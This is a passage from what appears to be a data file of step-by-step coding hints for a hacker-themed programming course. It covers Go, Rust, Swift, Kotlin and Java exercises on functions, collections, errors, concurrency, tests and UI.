    "For <code>'a'</code> to <code>'z'</code>: <code>r = 'a' + (r-'a'+rune(shift%26)+26)%26</code>. Do the same with <code>'A'</code> for uppercase.",
    "Write every rune with <code>b.WriteRune(r)</code>, changed or not, and return <code>b.String()</code>."
  ],
  go6: [
    "Define <code>type Node struct { Name string; Strength int }</code>.",
    "Add <code>func (n *Node) Boost(by int) int { n.Strength += by; return n.Strength }</code>. The <code>*</code> means it changes the real Node, not a copy.",
    "Add <code>func (n Node) Label() string { return fmt.Sprintf(\"%s(%d)\", n.Name, n.Strength) }</code>. This one only reads.",
    "Define <code>type Relay struct { Node; Hops int }</code>. Listing <code>Node</code> without a field name embeds it, so a Relay gets Node's fields and methods."
  ],
  go7: [
    "Import <code>\"errors\"</code> and <code>\"fmt\"</code>, then declare <code>var ErrDenied = errors.New(\"access denied\")</code>.",
    "Write <code>func unlock(code string) (string, error) {</code>. If <code>code == \"0451\"</code>, <code>return \"OPEN\", nil</code>.",
    "Otherwise <code>return \"\", fmt.Errorf(\"unlock %q: %w\", code, ErrDenied)</code>. <code>%w</code> wraps the original error inside the new one.",
    "Write <code>func safeUnlock(code string) string {</code>: call <code>unlock</code>, and <code>if errors.Is(err, ErrDenied) { return \"DENIED\" }</code>.",
    "Otherwise return the result. In Go you check <code>err</code> every time a function can fail."
  ],
  go8: [
    "Define the contract: <code>type Detector interface { Detect(line string) bool }</code>.",
    "Define <code>type Keyword struct { Word string }</code>.",
    "Give it the method: <code>func (k Keyword) Detect(line string) bool { return strings.Contains(line, k.Word) }</code>. Keyword now satisfies Detector, with no <code>implements</code> keyword needed.",
    "Write <code>func countHits(d Detector, lines []string) int {</code>: loop and count the lines where <code>d.Detect(l)</code> is true."
  ],
  go9: [
    "Write <code>func Filter[T any](xs []T, keep func(T) bool) []T {</code>. <code>T</code> is a type parameter.",
    "Inside, make an empty <code>out []T</code>, append each <code>x</code> where <code>keep(x)</code> is true, and return it.",
    "Define the constraint: <code>type Number interface { ~int | ~float64 }</code>. The <code>~</code> also allows custom types built on int or float64.",
    "Write <code>func Sum[N Number](xs []N) N {</code>: start with <code>var total N</code>, add every x, and return the total."
  ],
  go10: [
    "Write <code>func sweep(hosts []string) int {</code> and declare <code>var wg sync.WaitGroup</code>, <code>var mu sync.Mutex</code> and <code>up := 0</code>.",
    "For each host, call <code>wg.Add(1)</code>, then start <code>go func(h string) { ... }(h)</code>. Passing <code>h</code> in gives each goroutine its own copy.",
    "Inside the goroutine, put <code>defer wg.Done()</code> first. If <code>ping(h)</code> is true, do <code>mu.Lock(); up++; mu.Unlock()</code>.",
    "After the loop, <code>wg.Wait()</code> blocks until every goroutine has called Done. Then <code>return up</code>.",
    "The mutex stops two goroutines changing <code>up</code> at the same moment. Without it the count can come out wrong."
  ],
  go11: [
    "Write <code>func firstReply(ctx context.Context, hosts []string) (string, error) {</code>",
    "Make a buffered channel: <code>replies := make(chan string, len(hosts))</code>. Its buffer means late senders never get stuck.",
    "For each host, start <code>go func(host string) { replies &lt;- ping(host) }(h)</code>.",
    "Wait for whichever comes first: <code>select { case r := &lt;-replies: return r, nil; case &lt;-ctx.Done(): return \"\", ctx.Err() }</code>."
  ],
  go12: [
    "Import <code>\"encoding/json\"</code>, <code>\"net/http\"</code> and <code>\"testing\"</code>.",
    "Define <code>type Status struct { Node string `json:\"node\"`; Up bool `json:\"up\"` }</code>. The tags set the JSON key names.",
    "Paste in your <code>threatLevel</code> from rank 2.",
    "In <code>main</code>, register <code>http.HandleFunc(\"/status\", func(w http.ResponseWriter, r *http.Request) { json.NewEncoder(w).Encode([]Status{...}) })</code>, then call <code>http.ListenAndServe(\":8080\", nil)</code>.",
    "Write <code>func TestThreatLevel(t *testing.T) {</code> with a table of <code>{score, want}</code> cases. Loop over it and call <code>t.Errorf(...)</code> when a result doesn't match."
  ],

  // ---------------- Rust ----------------
  rs1: [
    "Write <code>fn intro(handle: &amp;str, level: u32) -&gt; String {</code>. <code>&amp;str</code> is borrowed text and <code>u32</code> is a whole number that can't be negative.",
    "Make the last line <code>format!(\"Agent {} // level {}\", handle, level)</code> with no semicolon. The last expression of a function is what it returns.",
    "In <code>fn main() {</code>, write <code>let mut counter = 0;</code>. Variables can't change unless you mark them <code>mut</code>.",
    "Do <code>counter += 1;</code>, then <code>println!(\"{} #{}\", intro(\"neo\", 3), counter);</code>."
  ],
  rs2: [
    "Write <code>fn threat_level(score: u32) -&gt; &amp;'static str {</code>. <code>&amp;'static str</code> means fixed text built into the program.",
    "Open <code>match score {</code>.",
    "Add arms with inclusive ranges: <code>90..=100 =&gt; \"CRITICAL\",</code> then <code>60..=89 =&gt; \"HIGH\",</code> then <code>30..=59 =&gt; \"MEDIUM\",</code>",
    "Finish with <code>_ =&gt; \"LOW\",</code>. <code>_</code> matches everything else, and Rust insists every possible value is covered."
  ],
  rs3: [
    "Add <code>use std::collections::HashMap;</code> at the top.",
    "Write <code>fn tally(ips: &amp;[String]) -&gt; HashMap&lt;String, u32&gt; {</code> and <code>let mut counts = HashMap::new();</code>",
    "Loop <code>for ip in ips {</code> and do <code>*counts.entry(ip.clone()).or_insert(0) += 1;</code>",
    "<code>entry(...).or_insert(0)</code> finds the slot, creating it at 0 if needed, and <code>*</code> lets you change the number inside it.",
    "End with <code>counts</code> (no semicolon) to return it."
  ],
  rs4: [
    "Write <code>fn count_words(text: &amp;str) -&gt; usize { text.split_whitespace().count() }</code>. It borrows the text and only reads it.",
    "Write <code>fn redact(msg: &amp;mut String) {</code>. <code>&amp;mut</code> is a borrow that's allowed to change the caller's String.",
    "Inside it, <code>*msg = String::from(\"[REDACTED]\");</code>. The <code>*</code> reaches through the reference to the real value.",
    "The caller has to pass <code>&amp;mut</code> too, like <code>redact(&amp;mut s)</code>."
  ],
  rs5: [
    "Write <code>fn caesar(text: &amp;str, shift: u8) -&gt; String {</code>",
    "Start a chain with <code>text.chars().map(|c| { ... })</code>. Each <code>c</code> is one character.",
    "Inside the closure, for ASCII letters pick <code>base = if c.is_ascii_lowercase() { b'a' } else { b'A' }</code>.",
    "Shift and wrap: <code>(((c as u8 - base + shift % 26) % 26) + base) as char</code>. Return other characters unchanged.",
    "End the chain with <code>.collect()</code> to build the String."
  ],
  rs6: [
    "Put <code>#[derive(Debug)]</code> above <code>struct Node { name: String, strength: u32 }</code>. It lets you print a Node with <code>{:?}</code>.",
    "In <code>impl Node {</code>, add <code>fn new(name: &amp;str) -&gt; Self { Self { name: name.to_string(), strength: 0 } }</code>.",
    "Add <code>fn boost(&amp;mut self, by: u32) -&gt; u32 { self.strength += by; self.strength }</code>.",
    "Define <code>enum Event { Login(String), Breach(u8), Logout }</code>. Each variant can carry its own data.",
    "Write <code>fn describe(e: &amp;Event) -&gt; String</code> with a <code>match</code> that has one arm per variant, for example <code>Event::Breach(sev) =&gt; format!(\"breach {sev}\")</code>."
  ],
  rs7: [
    "Define <code>#[derive(Debug)] enum ParseError { Empty, BadPort(String) }</code>.",
    "In <code>fn parse_port(s: &amp;str) -&gt; Result&lt;u16, ParseError&gt;</code>, start with <code>if s.is_empty() { return Err(ParseError::Empty); }</code>.",
    "Then <code>s.parse::&lt;u16&gt;().map_err(|_| ParseError::BadPort(s.to_string()))</code>. <code>map_err</code> swaps the error type for yours.",
    "In <code>fn ports(list: &amp;[&amp;str]) -&gt; Result&lt;Vec&lt;u16&gt;, ParseError&gt;</code>, loop and <code>out.push(parse_port(s)?);</code>. <code>?</code> returns early on the first error.",
    "Finish with <code>Ok(out)</code>."
  ],
  rs8: [
    "Define <code>trait Detector { fn detect(&amp;self, line: &amp;str) -&gt; bool; }</code>. A trait is a list of methods a type promises to have.",
    "Define <code>struct Keyword(String);</code>, a struct with one unnamed field reached as <code>self.0</code>.",
    "Implement it: <code>impl Detector for Keyword { fn detect(&amp;self, line: &amp;str) -&gt; bool { line.contains(&amp;self.0) } }</code>.",
    "Write <code>fn count_hits&lt;D: Detector&gt;(d: &amp;D, lines: &amp;[&amp;str]) -&gt; usize { lines.iter().filter(|l| d.detect(l)).count() }</code>."
  ],
  rs9: [
    "Write <code>fn fail_ips(lines: &amp;[&amp;str]) -&gt; Vec&lt;String&gt; {</code>",
    "Start with <code>lines.iter()</code>.",
    "Keep the FAIL lines: <code>.filter(|l| l.ends_with(\"FAIL\"))</code>.",
    "Take the first word: <code>.map(|l| l.split_whitespace().next().unwrap_or(\"\").to_string())</code>.",
    "Finish with <code>.collect()</code>. Iterator steps do nothing until something like <code>collect</code> asks for the results."
  ],
  rs10: [
    "Import <code>use std::sync::{Arc, Mutex}; use std::thread;</code>",
    "Create the shared counter: <code>let counter = Arc::new(Mutex::new(0));</code>. Arc shares ownership between threads, and Mutex allows one writer at a time.",
    "For each host, <code>let c = Arc::clone(&amp;counter);</code> and push <code>thread::spawn(move || { if ping(&amp;h) { *c.lock().unwrap() += 1; } })</code> into a list of handles.",
    "Join every handle with <code>h.join().unwrap();</code>.",
    "Return the count with <code>let n = *counter.lock().unwrap(); n</code>."
  ],
  rs11: [
    "Write <code>fn longest&lt;'a&gt;(a: &amp;'a str, b: &amp;'a str) -&gt; &amp;'a str { if b.len() &gt; a.len() { b } else { a } }</code>. <code>'a</code> says the result lives as long as both inputs.",
    "Below it, add <code>#[cfg(test)]</code> and <code>mod tests {</code> with <code>use super::*;</code>.",
    "Write a <code>#[test] fn picks_longer() { assert_eq!(longest(\"ab\", \"abc\"), \"abc\"); }</code>.",
    "Add a second <code>#[test]</code>, for example one where two equal-length strings return the first."
  ],
  rs12: [
    "Define <code>enum Status { Ok, Fail }</code> and <code>struct Record { ip: String, status: Status }</code>.",
    "Write <code>fn parse(line: &amp;str) -&gt; Result&lt;Record, String&gt;</code>. Split into exactly two parts, map <code>\"OK\"</code> or <code>\"FAIL\"</code> to a Status, and return <code>Err(...)</code> for anything else.",
    "Define <code>struct Summary { total: usize, fails: usize }</code> and <code>impl std::fmt::Display for Summary</code>, using <code>write!(f, \"{} lines, {} fails\", ...)</code>.",
    "Write <code>fn analyze(lines: &amp;[&amp;str]) -&gt; Summary</code>: <code>lines.iter().filter_map(|l| parse(l).ok())</code> keeps only the good records. Count them and their fails.",
    "Add a <code>#[cfg(test)] mod tests</code> with at least one <code>#[test]</code> using <code>assert_eq!</code>."
  ],

  // ---------------- Swift ----------------
  sw1: [
    "Write <code>func intro(handle: String, level: Int) -&gt; String {</code>. <code>-&gt; String</code> is the return type.",
    "Return <code>\"Agent \\(handle) // level \\(level)\"</code>. <code>\\( )</code> swaps a value into the text.",
    "Below the function, declare a constant with <code>let</code>, for example <code>let handle = \"neo\"</code>.",
    "Declare a variable with <code>var</code> and change it, for example <code>var level = 1</code> then <code>level += 2</code>.",
    "Print the result: <code>print(intro(handle: handle, level: level))</code>. Swift requires the labels <code>handle:</code> and <code>level:</code> when calling."
  ],
  sw2: [
    "Write <code>func threatLevel(_ score: Int) -&gt; String {</code>. The <code>_</code> lets callers skip the label.",
    "Use <code>switch score {</code> with range patterns: <code>case 90...: return \"CRITICAL\"</code>, <code>case 60..&lt;90: return \"HIGH\"</code>, <code>case 30..&lt;60: return \"MEDIUM\"</code>.",
    "Add <code>default: return \"LOW\"</code>. Swift switches must cover every value.",
    "Write <code>func validPin(_ pin: String) -&gt; Bool {</code> with <code>guard pin.count == 6, pin.allSatisfy(\\.isNumber) else { return false }</code>.",
    "After the guard, <code>return true</code>. <code>guard</code> deals with the bad cases first and leaves the happy path at the bottom."
  ],
  sw3: [
    "Write <code>func lookup(_ name: String, in db: [String: String]) -&gt; String {</code>",
    "Reading from a dictionary gives an Optional, either a value or <code>nil</code>. Unwrap it safely: <code>if let found = db[name] { return found }</code>.",
    "Then <code>guard let fallback = db[\"default\"] else { return \"unknown\" }</code>.",
    "Return <code>fallback</code>. One line also works: <code>return db[name] ?? db[\"default\"] ?? \"unknown\"</code>.",
    "Never write <code>!</code> after an Optional here. It crashes when the value is missing."
  ],
  sw4: [
    "Write <code>func tally(_ ips: [String]) -&gt; [String: Int] {</code> and <code>var counts: [String: Int] = [:]</code>.",
    "Loop <code>for ip in ips { counts[ip, default: 0] += 1 }</code>. <code>default: 0</code> covers keys that aren't there yet.",
    "Return <code>counts</code>.",
    "Write <code>func loud(_ ports: [Int]) -&gt; [Int] { ports.filter { $0 &gt; 1024 }.map { $0 * 10 } }</code>. This keeps ports above 1024 and multiplies each by 10. <code>$0</code> is the current element."
  ],
  sw5: [
    "Write <code>func scan(host: String, port: Int = 443) -&gt; String { \"\\(host):\\(port)\" }</code>. Callers can leave <code>port</code> out.",
    "Write <code>func retry(times: Int, _ op: () -&gt; Bool) -&gt; Bool</code>. Loop up to <code>times</code>, return true as soon as <code>op()</code> succeeds, and return false at the end.",
    "Call it with a trailing closure, which is the braces placed after the parentheses: <code>let ok = retry(times: 3) { Bool.random() }</code>.",
    "Declare <code>var handlers: [() -&gt; Void] = []</code> and <code>func onAlert(_ h: @escaping () -&gt; Void) { handlers.append(h) }</code>. <code>@escaping</code> is required because the closure is stored for later."
  ],
  sw6: [
    "Write <code>struct Node {</code> with <code>var name: String</code> and <code>var strength = 0</code>.",
    "Add a computed property: <code>var isHot: Bool { strength &gt; 80 }</code>. It's worked out each time you read it.",
    "Add <code>mutating func boost(_ by: Int) { strength += by }</code>. Structs need <code>mutating</code> to change themselves.",
    "Write <code>final class Session { let id: String; init(id: String) { self.id = id } }</code>. Classes are shared by reference, while structs are copied."
  ],
  sw7: [
    "Define <code>enum ScanError: Error { case empty; case badPort(String) }</code>.",
    "Write <code>func parsePort(_ s: String) throws -&gt; Int {</code>. <code>throws</code> warns callers that it can fail.",
    "<code>guard !s.isEmpty else { throw ScanError.empty }</code>",
    "<code>guard let p = Int(s), (1...65535).contains(p) else { throw ScanError.badPort(s) }</code>, then <code>return p</code>.",
    "Call it inside <code>do { let p = try parsePort(\"443\"); print(p) } catch { print(\"failed: \\(error)\") }</code>."
  ],
  sw8: [
    "Define <code>enum Event { case login(user: String); case breach(severity: Int); case logout }</code>.",
    "Write <code>func describe(_ e: Event) -&gt; String {</code> with <code>switch e {</code>.",
    "<code>case .login(let user): return \"login \\(user)\"</code> pulls the data out of the case.",
    "Put the <code>where</code> case BEFORE the general one: <code>case .breach(let s) where s &gt;= 8: return \"CRITICAL breach\"</code>, then <code>case .breach(let s): return \"breach \\(s)\"</code>.",
    "Add <code>case .logout: return \"logout\"</code>, then <code>enum Faction: String, CaseIterable { case logos, sentinel, meridian, lantern }</code>."
  ],
  sw9: [
    "Define <code>protocol Detector { func detect(_ line: String) -&gt; Bool }</code>.",
    "Add a default method in an extension: <code>extension Detector { func count(in lines: [String]) -&gt; Int { lines.filter(detect).count } }</code>.",
    "Write <code>struct Keyword: Detector { let word: String; func detect(_ line: String) -&gt; Bool { line.contains(word) } }</code>. Keyword gets <code>count(in:)</code> for free.",
    "Write <code>func strongest&lt;T: Comparable&gt;(_ xs: [T]) -&gt; T? { xs.max() }</code>. It returns <code>nil</code> for an empty array."
  ],
  sw10: [
    "Write <code>func ping(_ host: String) async -&gt; Bool</code>. Inside, <code>try? await Task.sleep(for: .milliseconds(10))</code>, then <code>return !host.isEmpty</code>.",
    "Write <code>actor Ledger { private var hits = 0; func record() { hits += 1 }; func total() -&gt; Int { hits } }</code>. An actor lets only one task touch its data at a time.",
    "Write <code>func sweep(_ hosts: [String]) async -&gt; Int {</code> and open <code>await withTaskGroup(of: Bool.self) { group in</code>.",
    "Add one child task per host: <code>for h in hosts { group.addTask { await ping(h) } }</code>.",
    "Count results as they arrive: <code>var up = 0; for await ok in group where ok { up += 1 }; return up</code>."
  ],
  sw11: [
    "Start with <code>import Testing</code>.",
    "Write the code under test as a <code>private</code> function, for example <code>private func parsePort(_ s: String) throws -&gt; Int</code>.",
    "Write a test: <code>@Test func parsesValidPort() throws { #expect(try parsePort(\"443\") == 443) }</code>.",
    "Write a parameterized test, which runs once per input: <code>@Test(\"rejects garbage\", arguments: [\"\", \"abc\", \"70000\"]) func rejects(_ input: String) { #expect(throws: ScanError.self) { try parsePort(input) } }</code>.",
    "This rank runs in GitHub Actions on Swift 6, because Judge0's Swift doesn't include Swift Testing."
  ],
  sw12: [
    "Start with <code>import SwiftUI</code>.",
    "Write the model: <code>@Observable final class Monitor { var alerts: [String] = []; func refresh() async { ... } }</code>.",
    "Write <code>struct ConsoleView: View {</code> with <code>@State private var monitor = Monitor()</code> and <code>@State private var filter = \"\"</code>.",
    "In <code>var body: some View</code>, show <code>List(monitor.alerts, id: \\.self) { Text($0) }</code>.",
    "Add <code>Button(\"Refresh\") { Task { await monitor.refresh() } }</code>. <code>Task</code> runs the async work without freezing the UI."
  ],
  // ---------------- Kotlin ----------------
  kt1: [
      "Kotlin functions start with <code>fun</code>. Write <code>fun intro(handle: String, level: Int): String</code>. Each input is written as <code>name: Type</code>, and the type after the closing bracket is what the function returns.",
      "Make it a one-line function with <code>=</code> and a string template: <code>= \"Agent $handle // level $level\"</code>. A <code>$</code> followed by a name drops that value into the text.",
      "Write <code>fun main() {</code>. This is where a Kotlin program starts running.",
      "Inside <code>main</code>, add a value that never changes, <code>val handle = \"neo\"</code>, and one that can change, <code>var runs = 0</code>. Then change it with <code>runs += 1</code>.",
      "Print the result with <code>println(intro(handle, 3))</code>, then close <code>main</code> with <code>}</code>."
  ],
  kt2: [
      "Write <code>fun threatLevel(score: Int): String = when (score) {</code>. <code>when</code> checks a value against a list of cases, top to bottom.",
      "Add one case per line: <code>in 90..100 -&gt; \"CRITICAL\"</code>, <code>in 60..89 -&gt; \"HIGH\"</code> and <code>in 30..59 -&gt; \"MEDIUM\"</code>. <code>a..b</code> is a range that includes both ends.",
      "Finish with <code>else -&gt; \"LOW\"</code> and a closing <code>}</code>. A <code>when</code> that returns a value needs an <code>else</code> so every score gets an answer.",
      "Add a loop that counts down: <code>for (i in 10 downTo 0 step 2) println(\"T-$i\")</code>. Put it inside a function such as <code>fun countdown() { ... }</code>."
  ],
  kt3: [
      "Write <code>fun tally(ips: List&lt;String&gt;): Map&lt;String, Int&gt; =</code>. A <code>Map</code> pairs each key (an IP) with a value (its count).",
      "Finish the line with <code>ips.groupingBy { it }.eachCount()</code>. <code>{ it }</code> is a tiny function that groups each item by itself, and <code>eachCount()</code> counts each group.",
      "Build a map by hand with <code>to</code> pairs: <code>val ports = mapOf(\"ssh\" to 22, \"https\" to 443)</code>.",
      "Check it: <code>tally(listOf(\"a\", \"b\", \"a\"))</code> should give <code>{a=2, b=1}</code>, and an empty list should give an empty map."
  ],
  kt4: [
      "Write <code>fun scan(host: String, port: Int = 443): String = \"$host:$port\"</code>. <code>= 443</code> is a default, used when the caller leaves the port out.",
      "Call it with a named argument somewhere, such as inside <code>main</code>: <code>scan(\"relay\", port = 8443)</code>. Naming the argument makes the call easier to read.",
      "Add an extension function, which bolts a new method onto an existing type: <code>fun String.isPrivateIp(): Boolean = startsWith(\"10.\") || startsWith(\"192.168.\") || startsWith(\"172.16.\")</code>. Inside it, <code>startsWith</code> runs on the string itself.",
      "Write a function that takes a function: <code>fun repeatScan(times: Int, action: (Int) -&gt; Unit) { for (i in 1..times) action(i) }</code>.",
      "Call it with a trailing lambda, meaning the braces go outside the brackets: <code>repeatScan(3) { attempt -&gt; println(\"attempt $attempt\") }</code>."
  ],
  kt5: [
      "Write <code>fun lookup(name: String, db: Map&lt;String, String&gt;): String = db[name] ?: \"unknown\"</code>. <code>db[name]</code> can be <code>null</code> (missing), and <code>?:</code> (the Elvis operator) supplies a fallback.",
      "Write <code>fun parseKv(s: String): Map&lt;String, String&gt; =</code> and start the chain with <code>s.split(\";\")</code>, which turns <code>\"host=relay;port=22\"</code> into <code>[\"host=relay\", \"port=22\"]</code>.",
      "Drop empty pieces with <code>.filter { \"=\" in it }</code>.",
      "Turn each piece into a pair with <code>.associate { val (k, v) = it.split(\"=\", limit = 2); k.trim() to v.trim() }</code>. <code>associate</code> builds a map from the pairs.",
      "Check it: <code>parseKv(\"host=relay;port=22\")[\"port\"]</code> should be <code>\"22\"</code>."
  ],
  kt6: [
      "Write <code>data class Node(val name: String, val strength: Int = 0)</code>. <code>data</code> gives you equality, printing and <code>copy</code> for free.",
      "Write a singleton (a class with exactly one instance): <code>object Registry { val nodes = mutableListOf&lt;Node&gt;() }</code>.",
      "Write a class with a factory in its companion object: <code>class Session private constructor(val id: String) { companion object { fun create(): Session = Session(\"s-1\") } }</code>.",
      "In <code>main</code>, make <code>val a = Node(\"north\", 40)</code>, then change one field in a copy with <code>val b = a.copy(strength = 90)</code>.",
      "Destructure the copy into two variables: <code>val (name, strength) = b</code>, then print them."
  ],
  kt7: [
      "Write your own exception: <code>class BadPort(val input: String) : Exception(\"bad port: $input\")</code>. The part after <code>:</code> says it is a kind of <code>Exception</code>.",
      "Write <code>fun parsePort(s: String): Int {</code>. First line: <code>val p = s.toIntOrNull() ?: throw BadPort(s)</code>. <code>toIntOrNull</code> gives <code>null</code> for text like <code>\"http\"</code>, and then we throw.",
      "Next line: <code>require(p in 1..65535) { \"port out of range: $p\" }</code>. <code>require</code> throws when its condition is false. Then <code>return p</code> and close the function.",
      "In <code>main</code>, handle errors with try as an expression: <code>val first = try { parsePort(\"443\") } catch (e: BadPort) { -1 }</code>.",
      "Handle them a second way: <code>val second = runCatching { parsePort(\"abc\") }.getOrDefault(-1)</code>."
  ],
  kt8: [
      "Write <code>sealed interface Event</code>. \"Sealed\" means every kind of Event is declared in this file, so Kotlin can check that you covered them all.",
      "Add the kinds: <code>data class Login(val user: String) : Event</code>, <code>data class Breach(val severity: Int) : Event</code> and <code>data object Logout : Event</code>.",
      "Write <code>fun describe(e: Event): String = when (e) {</code>, with <code>is Login -&gt; \"${e.user} in\"</code>, <code>is Breach -&gt; \"BREACH sev ${e.severity}\"</code> and <code>Logout -&gt; \"logout\"</code>. Don't add <code>else</code>, so the compiler can catch a missing case.",
      "Add an enum with a property: <code>enum class Faction(val color: String) { LOGOS(\"#c79bff\"), SENTINEL(\"#5ad1ff\") }</code>."
  ],
  kt9: [
      "Write <code>interface Detector { fun detect(line: String): Boolean }</code>. An interface lists methods without saying how they work.",
      "Write a class others can extend: <code>open class Rule(val name: String) { open fun label(): String = \"rule:$name\" }</code>. Kotlin classes are closed unless marked <code>open</code>.",
      "Write <code>class Keyword(private val word: String) : Rule(\"keyword\"), Detector {</code>. It extends <code>Rule</code> and implements <code>Detector</code>.",
      "Inside it, add <code>override fun detect(line: String): Boolean = word in line</code> and <code>override fun label(): String = \"keyword:$word\"</code>, then close with <code>}</code>.",
      "Write the generic function: <code>fun &lt;T : Comparable&lt;T&gt;&gt; strongest(xs: List&lt;T&gt;): T? = xs.maxOrNull()</code>. <code>T</code> can be any type that can be compared, and <code>T?</code> allows <code>null</code> for an empty list."
  ],
  kt10: [
      "Add <code>import kotlinx.coroutines.*</code> at the top.",
      "Write <code>suspend fun ping(host: String): Boolean { delay(50); return host.isNotEmpty() }</code>. <code>suspend</code> means it can pause without blocking a thread.",
      "Write <code>suspend fun sweep(hosts: List&lt;String&gt;): Int = coroutineScope {</code>, then <code>hosts.map { h -&gt; async { ping(h) } }.awaitAll().count { it }</code> and <code>}</code>. <code>async</code> starts every ping at once and <code>awaitAll</code> waits for them all.",
      "Write <code>fun main() = runBlocking {</code>, which keeps the program alive while coroutines run.",
      "Inside it, add <code>launch { println(\"heartbeat\") }</code> and <code>println(\"up: ${sweep(listOf(\"a\", \"b\", \"\"))}\")</code>, then close with <code>}</code>."
  ],
  kt11: [
      "Add <code>import kotlin.test.*</code> at the top.",
      "Write the code under test: <code>fun parsePort(s: String): Int { val p = s.toIntOrNull() ?: throw IllegalArgumentException(\"bad port\"); require(p in 1..65535); return p }</code>.",
      "Write <code>class PortParserTest {</code>. A test class groups related tests.",
      "Add a test: <code>@Test fun parsesValidPort() { assertEquals(443, parsePort(\"443\")) }</code>. <code>assertEquals(expected, actual)</code> fails the test when they differ.",
      "Add a second test: <code>@Test fun rejectsGarbage() { assertFailsWith&lt;IllegalArgumentException&gt; { parsePort(\"abc\") } }</code>, then close the class."
  ],
  kt12: [
      "Add the imports for Compose (<code>LazyColumn</code>, <code>items</code>, <code>Button</code>, <code>Text</code>, <code>androidx.compose.runtime.*</code>), <code>ViewModel</code>, <code>viewModelScope</code> and the coroutine flow classes.",
      "Declare the screen states: <code>sealed interface UiState { data object Loading : UiState; data class Ready(val alerts: List&lt;String&gt;) : UiState }</code>.",
      "Write <code>class ConsoleViewModel : ViewModel() {</code> with <code>private val _state = MutableStateFlow&lt;UiState&gt;(UiState.Loading)</code> and <code>val state: StateFlow&lt;UiState&gt; = _state</code>. Only the ViewModel can change the state.",
      "Add <code>fun refresh() { viewModelScope.launch { _state.value = UiState.Ready(listOf(\"north ok\")) } }</code>, then close the class.",
      "Write <code>@Composable fun ConsoleScreen(vm: ConsoleViewModel) {</code> with <code>val state by vm.state.collectAsState()</code> and <code>var filter by remember { mutableStateOf(\"\") }</code>.",
      "Show <code>Button(onClick = { vm.refresh() }) { Text(\"Refresh\") }</code>.",
      "Then pick what to show from the state: <code>when (val s = state) { UiState.Loading -&gt; Text(\"loading...\"); is UiState.Ready -&gt; LazyColumn { items(s.alerts) { Text(it) } } }</code>, and close the function."
  ],
  // ---------------- Java ----------------
  jv1: [
      "Java code lives inside a class. Keep <code>public class Intro {</code> from the starter and write everything inside its braces.",
      "Write <code>static String intro(String handle, int level) {</code>. In Java the type comes before each name, and <code>String</code> before <code>intro</code> is the return type.",
      "Inside, write <code>return \"Agent \" + handle + \" // level \" + level;</code>. <code>+</code> joins text, and every statement ends with <code>;</code>.",
      "Write <code>public static void main(String[] args) {</code>. This is where the program starts.",
      "Inside <code>main</code>, add <code>var handle = \"neo\";</code> (<code>var</code> lets Java work out the type), then <code>System.out.printf(\"%s%n\", intro(handle, 3));</code>. <code>%s</code> is replaced by the text and <code>%n</code> is a new line.",
      "Close <code>main</code>, then the class, with <code>}</code>."
  ],
  jv2: [
      "Inside <code>public class Triage {</code>, write <code>static String threatLevel(int score) {</code>.",
      "Check from the highest score down: <code>if (score &gt;= 90) return \"CRITICAL\";</code>, then <code>else if (score &gt;= 60) return \"HIGH\";</code>, then <code>else if (score &gt;= 30) return \"MEDIUM\";</code>, and finally <code>else return \"LOW\";</code>.",
      "Write <code>static int portFor(String service) {</code> and start a switch expression with <code>return switch (service) {</code>.",
      "Add one arrow case per line: <code>case \"ssh\" -&gt; 22;</code>, <code>case \"http\" -&gt; 80;</code>, <code>case \"https\" -&gt; 443;</code> and <code>default -&gt; -1;</code>.",
      "Close the switch with <code>};</code> (it needs the semicolon because it is part of the <code>return</code> statement), then close the method and the class."
  ],
  jv3: [
      "Add <code>import java.util.*;</code> at the very top so you can use <code>Map</code>, <code>List</code> and <code>HashMap</code>.",
      "Inside <code>public class Tally {</code>, write <code>static Map&lt;String, Integer&gt; tally(List&lt;String&gt; ips) {</code>. The types in angle brackets say what the collection holds.",
      "Create an empty map: <code>Map&lt;String, Integer&gt; counts = new HashMap&lt;&gt;();</code>.",
      "Loop over the IPs with <code>for (String ip : ips) {</code> and inside write <code>counts.merge(ip, 1, Integer::sum);</code>. <code>merge</code> stores 1 for a new IP, or adds 1 to the existing count.",
      "After the loop, <code>return counts;</code> and close the method and the class."
  ],
  jv4: [
      "Inside <code>public class Scanner {</code>, write the full version first: <code>static String scan(String host, int port) { return host + \":\" + port; }</code>.",
      "Write a second method with the same name but fewer inputs. This is called an overload: <code>static String scan(String host) { return scan(host, 443); }</code>. It hands off to the full version with 443.",
      "Write a varargs method, which accepts any number of ints: <code>static int sum(int... xs) {</code>. Inside the method, <code>xs</code> is an array.",
      "Inside, write <code>int total = 0;</code>, then <code>for (int x : xs) total += x;</code>, then <code>return total;</code>. Calling <code>sum()</code> with nothing returns 0."
  ],
  jv5: [
      "Inside <code>public class Cipher {</code>, add a text block (text spread over several lines): <code>static final String BRIEF = \"\"\"</code>, then a couple of lines of text, then <code>\"\"\";</code> on its own line.",
      "Write <code>static String caesar(String text, int shift) {</code> and create <code>StringBuilder sb = new StringBuilder();</code>, which builds text efficiently.",
      "Make the shift safe for any number: <code>int s = ((shift % 26) + 26) % 26;</code>.",
      "Loop with <code>for (char c : text.toCharArray()) {</code>. For uppercase letters, append <code>(char) ('A' + (c - 'A' + s) % 26)</code>. For lowercase letters, do the same with <code>'a'</code>. Append anything else unchanged.",
      "After the loop, <code>return sb.toString();</code>."
  ],
  jv6: [
      "Write <code>record Node(String name, int strength) {</code>. A record is a small class that holds data, and Java writes the constructor, accessors (<code>name()</code>) and <code>equals</code> for you.",
      "Inside, add a compact constructor, <code>public Node {</code>, which runs your checks before the fields are set.",
      "Add <code>if (name == null || name.isBlank()) throw new IllegalArgumentException(\"name required\");</code> and <code>if (strength &lt; 0) throw new IllegalArgumentException(\"strength must be &gt;= 0\");</code>, then close both braces.",
      "Write <code>class Session { private final String id; Session(String id) { this.id = id; } String id() { return id; } }</code>. <code>private final</code> means only this class can see the field, and it can only be set once.",
      "Add an enum: <code>enum Faction { LOGOS, SENTINEL, MERIDIAN, LANTERN }</code>."
  ],
  jv7: [
      "Add <code>import java.io.*;</code> and <code>import java.nio.file.*;</code> at the top.",
      "Write <code>class BadPortException extends Exception { BadPortException(String msg, Throwable cause) { super(msg, cause); } }</code>. Extending <code>Exception</code> (not <code>RuntimeException</code>) makes it a checked exception that callers must handle.",
      "In <code>public class Ports {</code>, write <code>static int parsePort(String s) throws BadPortException {</code> and open a <code>try {</code>.",
      "Inside the try: <code>int p = Integer.parseInt(s);</code>, then <code>if (p &lt; 1 || p &gt; 65535) throw new BadPortException(\"out of range: \" + p, null);</code>, then <code>return p;</code>.",
      "Close it with <code>} catch (NumberFormatException e) { throw new BadPortException(\"not a number: \" + s, e); }</code>.",
